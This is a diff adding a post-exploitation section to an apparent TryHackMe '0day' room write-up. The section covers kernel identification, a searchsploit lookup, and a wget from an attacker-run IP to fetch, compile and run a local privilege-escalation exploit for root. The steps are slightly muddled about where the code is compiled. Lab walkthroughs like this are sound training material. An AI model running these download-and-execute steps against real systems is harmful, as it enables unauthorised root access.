@@ -1,5 +1,5 @@
 ---
-{"dg-publish":true,"permalink":"/try-hack-me-rooms/0day/","tags":["offensivesecurity","ethicalhacking","0day","tryhackme"],"created":"2026-04-08T21:25:31.537+02:00","updated":"2026-04-11T12:40:42.669+02:00","dg-note-properties":{"tags":["offensivesecurity","ethicalhacking","0day","tryhackme"]}}
+{"dg-publish":true,"permalink":"/try-hack-me-rooms/0day/","tags":["offensivesecurity","ethicalhacking","0day","tryhackme"],"created":"2026-04-08T21:25:31.537+02:00","updated":"2026-04-11T19:47:57.328+02:00","dg-note-properties":{"tags":["offensivesecurity","ethicalhacking","0day","tryhackme"]}}
 ---
 
 
@@ -177,17 +177,58 @@ Running the command above reveals a user **ryan**. Let's explore his home direct
 
 Sure enough it is indeed in his home directory.  Now socat is not installed on the system 
 
-
-
-
-
 -----
+## Post-exploitation
 
-
-
+For upgrading the shell there seems to be no luck as the user **www-data**. The pty module is not installed, socat is not installed, execution rights are restricted for perl. So let's move on to other and better things. 
 
 ----
-## Post-exploitation
+### Kernel Exploits
+
+Identifying the kernel
+
+```bash
+uname -a 
+```
+
+```bash
+Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
+```
+
+So the version running on target is **3.13.0**. Let's have a look using searchsploit.
+
+```bash
+searchsploit 3.13.0
+```
+
+![](/img/user/Attachments/searchsploit.png)
+
+A few exploits come up. Let's look at [ExploitDB](https://www.exploit-db.com/exploits/37292) for the code. 
+
+![](/img/user/Attachments/exploit-dbcve.png)
+
+```bash
+
+# copy the .c code to a file on local machine
+nano exploit.c
+
+# from target shell, acquire the exploit
+wget http://192.168.225.98:8888/exploit.c
+
+# Compiling on local machine
+gcc -o output_name source_name
+
+```
+
+Now that the `exploit.c` from the github repo has been compiled on local machine, it's time to download it from target machine while in the `/tmp` directory. Change its permissions and run it.
+
+
+![](/img/user/Attachments/root%202.png)
+
+And **root** is achieved.
+
+----
+
 
 
 -----
